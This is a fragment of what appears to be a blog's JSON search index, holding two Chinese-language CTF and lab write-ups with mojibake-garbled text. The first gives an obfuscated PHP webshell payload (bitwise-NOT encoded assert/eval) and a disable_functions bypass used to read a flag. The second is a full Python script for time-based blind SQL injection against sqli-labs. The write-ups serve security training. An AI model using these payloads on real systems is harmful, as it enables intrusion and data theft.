7 %9E%8C%8C%9A%8D%8B %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6 // ä¼ å€¼å¾—å–å code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); ç”¨webå·¥å…·è¿æ¥ï¼Œèšå‰‘ åœ¨ä¹‹å‰çš„phpinfoèƒ½çœ‹åˆ°å¾ˆå¤šå‡½æ•°è¢«ç¦ç”¨äº†ï¼Œèšå‰‘ä¸èƒ½è°ƒç”¨ç»ˆç«¯ï¼Œæ‰€ä»¥å¾—å¼€ä»£ç†ä¸‹è½½ä¸€ä¸ªèšå‰‘æ’ä»¶ï¼Œåœ¨æ’ä»¶å¸‚åœºé‡Œï¼Œä¸‹è½½disable_functionsçš„æ’ä»¶ ç„¶ååœ¨webshellè¿æ¥é¡µé¢ï¼Œå¯ç”¨æ’ä»¶ï¼Œé€‰æ‹©æ¨¡å¼ PHP7çš„UAF\nåœ¨æ ¹ç›®å½•çœ‹è§readflagï¼Œè¿è¡Œçš„å¾—åˆ°flagï½\n","date":"2022-06-24T00:00:00Z","image":"http://main1o.eu.org/CachedImage_2880_1800_POS4.jpg","permalink":"http://main1o.eu.org/p/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98_2019_rce_me/","title":"æå®¢å¤§æŒ‘æˆ˜_2019_RCE_ME"},{"content":"å»¶è¿Ÿæ³¨å…¥demo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #!/usr/bin/env python # -*- coding: utf-8 -*- \u0026#39;\u0026#39;\u0026#39; @@main1o sqli_labs_9 \u0026#39;\u0026#39;\u0026#39; import requests import datetime payloads = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39; def database_len(inject): for i in range(1,10): url = \u0026#34;{inject} and if(length(database())={i},sleep(4),0)%23\u0026#34;.format(inject=inject,i=i) time_1 = datetime.datetime.now() requ = requests.get(url) time_2 = datetime.datetime.now() time_3 = (time_2-time_1).total_seconds() if time_3 \u0026gt;= 4: break print(f\u0026#34;[+]å½“å‰æ•°æ®åº“é•¿åº¦:{i}\u0026#34;) def database_name(inject): name = \u0026#39;\u0026#39; for i in range(1,9): for p in payloads: url = \u0026#34;{inject} and if(substr(database(),{i},1)=\u0026#39;{p}\u0026#39;,sleep(4),1)%23\u0026#34;.format(inject=inject,i=i,p=p) time_1 = datetime.datetime.now() requ = requests.get(url) time_2 = datetime.datetime.now() time_3 = (time_2-time_1).total_seconds() if time_3 \u0026gt;= 4: name += p break return name if __name__ == \u0026#39;__main__\u0026#39;: inject = input(\u0026#39;[+]æ³¨å…¥ç‚¹(http://xxx/?id=1):\u0026#39;) database_len(inject) dbname = database_name(inject) print(f\u0026#39;[+]å½“å‰æ•°æ®åº“åå­—:{dbname}\u0026#39;) ","date":"2022-05-29T20:15:18Z","image":"http://main1o.eu.org/image83.png","permalink":"http://main1o.eu.org/p/sqli_labs_9/","title":"sqli_labs_9"}]